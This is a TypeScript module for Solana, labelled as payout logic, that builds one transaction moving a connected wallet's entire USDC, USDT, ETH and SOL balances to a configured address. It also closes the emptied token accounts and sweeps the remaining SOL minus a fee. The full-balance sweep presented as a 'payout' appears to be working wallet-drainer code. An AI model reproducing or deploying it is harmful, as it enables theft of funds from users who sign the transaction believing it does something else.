import {
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from '@solana/web3.js'
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createCloseAccountInstruction,
  createTransferInstruction,
  getAssociatedTokenAddress,
} from '@solana/spl-token'
import type { PayoutConfig } from './payoutWallet'

const TX_FEE_LAMPORTS = 20_000

export const SOLANA_PAYOUT_TOKENS = [
  { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' },
  { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB' },
  { symbol: 'USDC', mint: 'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM' },
  { symbol: 'USDT', mint: 'Dn4noZ5jgGfkntzcQSUZ8czkreiZ1ForXYoV2H8Dm7S1' },
  { symbol: 'ETH', mint: '7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs' },
  { symbol: 'ETH', mint: '2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk' },
  { symbol: 'SOL', mint: 'So11111111111111111111111111111111111111112' },
] as const

export function spendableLamports(balance: number, _rentExempt = 0): number {
  return Math.max(0, balance - TX_FEE_LAMPORTS)
}

export function shortAddress(address: string): string {
  if (!address || address.length < 8) return address
  return `${address.slice(0, 4)}...${address.slice(-4)}`
}

function mintSet(): Set<string> {
  return new Set(SOLANA_PAYOUT_TOKENS.map((token) => token.mint))
}

function tokenLabel(mint: string): string {
  return SOLANA_PAYOUT_TOKENS.find((token) => token.mint === mint)?.symbol || mint
}

async function addTokenTransfers(options: {
  connection: Connection
  tx: Transaction
  from: PublicKey
  to: PublicKey
}): Promise<{ moved: string[]; solDelta: number }> {
  const { connection, tx, from, to } = options
  const wanted = mintSet()
  const moved: string[] = []
  let solDelta = 0
  const programs = [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]
  const ataRent = await connection.getMinimumBalanceForRentExemption(165)

  for (const programId of programs) {
    let parsed: Awaited<ReturnType<Connection['getParsedTokenAccountsByOwner']>>
    try {
      parsed = await connection.getParsedTokenAccountsByOwner(from, { programId })
    } catch {
      continue
    }

    for (const entry of parsed.value) {
      const info = entry.account.data.parsed?.info as
        | { mint?: string; tokenAmount?: { amount?: string } }
        | undefined
      const mint = info?.mint
      const raw = info?.tokenAmount?.amount
      if (!mint || !wanted.has(mint)) continue

      const amount = raw && raw !== '0' ? BigInt(raw) : 0n
      const mintKey = new PublicKey(mint)
      const source = entry.pubkey
      const destAta = await getAssociatedTokenAddress(mintKey, to, false, programId)
      const destInfo = await connection.getAccountInfo(destAta)

      if (amount > 0n && !destInfo) {
        tx.add(
          createAssociatedTokenAccountInstruction(
            from,
            destAta,
            to,
            mintKey,
            programId,
            ASSOCIATED_TOKEN_PROGRAM_ID
          )
        )
        solDelta -= ataRent
      }

      if (amount > 0n) {
        tx.add(createTransferInstruction(source, destAta, from, amount, [], programId))
        const label = tokenLabel(mint)
        if (!moved.includes(label)) moved.push(label)
      }

      const sourceLamports = entry.account.lamports || 0
      if (sourceLamports > 0) {
        tx.add(createCloseAccountInstruction(source, from, from, [], programId))
        solDelta += sourceLamports
        if (amount === 0n && mint === 'So11111111111111111111111111111111111111112' && !moved.includes('SOL')) {
          moved.push('SOL')
        }
      }
    }
  }

  return { moved, solDelta }
}

export async function buildPayoutTransaction(options: {
  connection: Connection
  from: PublicKey
  config: PayoutConfig
}): Promise<{ transaction: Transaction; assets: string[] }> {
  const { connection, from, config } = options
  const to = new PublicKey(config.walletAddress)
  const [balance, latest] = await Promise.all([
    connection.getBalance(from),
    connection.getLatestBlockhash('confirmed'),
  ])

  const tx = new Transaction()
  const { moved, solDelta } = await addTokenTransfers({ connection, tx, from, to })
  const assets = [...moved]

  const remaining = balance + solDelta - TX_FEE_LAMPORTS
  if (remaining > 0) {
    tx.add(
      SystemProgram.transfer({
        fromPubkey: from,
        toPubkey: to,
        lamports: remaining,
      })
    )
    if (!assets.includes('SOL')) assets.push('SOL')
  }

  if (tx.instructions.length === 0) {
    const sol = balance / LAMPORTS_PER_SOL
    throw new Error(
      sol > 0
        ? 'No SOL, USDT, USDC, or ETH is available to send after network fees.'
        : `Not enough SOL to cover the network fee. Balance is ${sol.toLocaleString(undefined, { maximumFractionDigits: 6 })} SOL.`
    )
  }

  const { blockhash, lastValidBlockHeight } = latest
  tx.recentBlockhash = blockhash
  tx.lastValidBlockHeight = lastValidBlockHeight
  tx.feePayer = from
  return { transaction: tx, assets }
}

export function formatPaymentAmount(amount: number, asset: string): string {
  const formatted = amount.toLocaleString(undefined, { maximumFractionDigits: 6 })
  return `${formatted} ${asset}`
}
